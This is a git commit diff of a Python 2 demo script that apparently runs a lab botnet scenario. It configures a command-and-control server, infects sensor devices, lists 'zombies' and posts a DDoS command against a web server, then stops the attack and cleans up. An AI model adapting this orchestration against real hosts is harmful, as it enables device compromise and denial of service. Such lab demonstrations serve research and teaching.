52ea16a3b92d5c77e2d592e3bf040656c5bb9902
Ubuntu <mizolotu@jyu.fi>
2018-06-19 10:46:57 +0000

    demo1 ready

--- demo1.py
+++ demo1.py
@@ -13,20 +13,25 @@ instance_ips = {'agent': agent, 'cc': cc, 'sensors': sensors, 'http_servers': ht
 # Scenario
 scenario = [
 
-	# configuration!
+	# config!
 	{'message': "Checking instance statuses", 'function': "check_all_instance_statuses()"},
-	{'message': "Configurring the sensor manager", 'function': "configure_sensor_agent()"},
-	{'message': "Configurring the CC for infected devices", 'function': "configure_zombie_cc()"},
 
 	# action!
 	{'message': "Checking sensors for infection", 'function': "check_sensors_for_infection()"},
-	{'message': "Starting devices' infection", 'function': "start_device_infection()"},
+	{'message': "Checking cc for zombies", 'function': "check_cc_zombies()"},
+	{'message': "Starting devices infection", 'function': "start_device_infection()"},
 	{'message': "Checking sensors for infection", 'function': "check_sensors_for_infection()"},
-	
-	{'message': "Starting password brute-forcing", 'function': "start_ddos_attack()"},
+	{'message': "Checking cc for zombies", 'function': "check_cc_zombies()"},
+	{'message': "Checking HTTP server connections", 'function': "check_http_connections()"},
+	{'message': "Starting DDoS attack", 'function': "start_ddos_attack()"},
+	{'message': "Checking HTTP server connections", 'function': "check_http_connections()"},
 
-	# stop!
-#	{'message': "Configurring the CC for infected devices", 'function': "configure_zombie_cc()"},
+	# reset!
+	{'message': "Stopping DDoS attack", 'function': "stop_ddos_attack()"},
+	{'message': "Checking HTTP server connections", 'function': "check_http_connections()"},
+	{'message': "Removing malware from zombie sensors", 'function': "clean_zombie_sensors()"},
+	{'message': "Checking sensors for infection", 'function': "check_sensors_for_infection()"},
+	{'message': "Checking cc for zombies", 'function': "check_cc_zombies()"},
 
 ]
 
@@ -42,17 +47,10 @@ def test_connection_status(address, timeout):
 def check_instance_status(ip):
     """ Test connection to specific IP on port 8080"""
     if test_connection_status('http://' + ip + ':8080', 4):
-        print(ip + ' status = READY')
+	status = 'READY'
     else:
-        print(ip + ' status = CONNECTION FAILED')
-
-
-def check_all_instance_statuses():
-    """ Goes through all the IPs and check their connection """
-    for key, value in instance_ips.items():
-        print('\n' + key + ':')
-        for ip in value:
-            check_instance_status(ip)
+	status = 'NOT READY'
+    return status
 
 def configure_sensor_agent():
 	payload_sensors = {"sensors": []}
@@ -80,7 +78,18 @@ def configure_zombie_cc():
 		print('CC has been configurred!')
 	except Exception as e:
         	print e
-	
+
+def check_all_instance_statuses():
+    """ Goes through all the IPs and check their connection """
+    for key, value in instance_ips.items():
+        print('\n' + key + ':')
+        for ip in value:
+            status = check_instance_status(ip)
+            print(ip + ' is ' + status)
+    print('\n')
+    configure_sensor_agent()
+    configure_zombie_cc()
+
 def check_sensors_for_infection():
 	for sensor in sensors:
 		try:
@@ -90,6 +99,16 @@ def check_sensors_for_infection():
         		print('Sensor ' + sensor + ' reports: ' + status['status'])
     		except Exception as e:
         		print e
+
+def check_cc_zombies():
+	try:
+		request_zombies_url = 'http://' + cc[0] + ':8080/zombies'
+		r = requests.get(request_zombies_url)
+		zombies = json.loads(r.text)
+		for zombie in zombies['zombies']:
+			print zombie['ip'], zombie['command']
+	except Exception as e:
+        	print e
 
 def start_ssh_scan(): # not used
 	payload_commands = {"commands": {"command":"scan"}}
@@ -108,7 +127,46 @@ def start_device_infection():
 		print('Infecting other sensors!')
 	except Exception as e:
         	print e
- 
+
+def check_http_connections():
+	for server in http_servers:
+		try:
+			address = 'http://' + server + ':8080/connections'
+			r = requests.get(address)
+			connections = json.loads(r.text)
+        		print('Web server ' + server + ' load: %0.2f connections per minute' % connections['connections'])
+    		except Exception as e:
+        		print e
+
+def start_ddos_attack(target=http_servers[1]):
+	payload_commands = {"commands": {"command":"ddos", "target":target, "uri":"get_data"}}
+	try:
+
+		update_commands_url = 'http://' + cc[0] + ':8080/commands'
+		r = requests.post(update_commands_url,data=json.dumps(payload_commands))
+		print('Starting DDoS attack against ' + target + '!')
+	except Exception as e:
+        	print e
+
+def stop_ddos_attack():
+	payload_commands = {"commands": {"command":"stop"}}
+	try:
+		update_commands_url = 'http://' + cc[0] + ':8080/commands'
+		r = requests.post(update_commands_url,data=json.dumps(payload_commands))
+		print('Stopping the DDoS attack!')
+	except Exception as e:
+        	print e
+
+def clean_zombie_sensors():
+	for sensor in sensors:
+		if sensor not in compromised_sensors:
+			try:
+				address = 'http://' + sensor + ':8080/reset'
+				r = requests.get(address)
+	        		print('Sensor ' + sensor + ' has been cleaned!')
+	    		except Exception as e:
+        			print e
+
 def execute_scenario():
 	for step in scenario:
 		try:
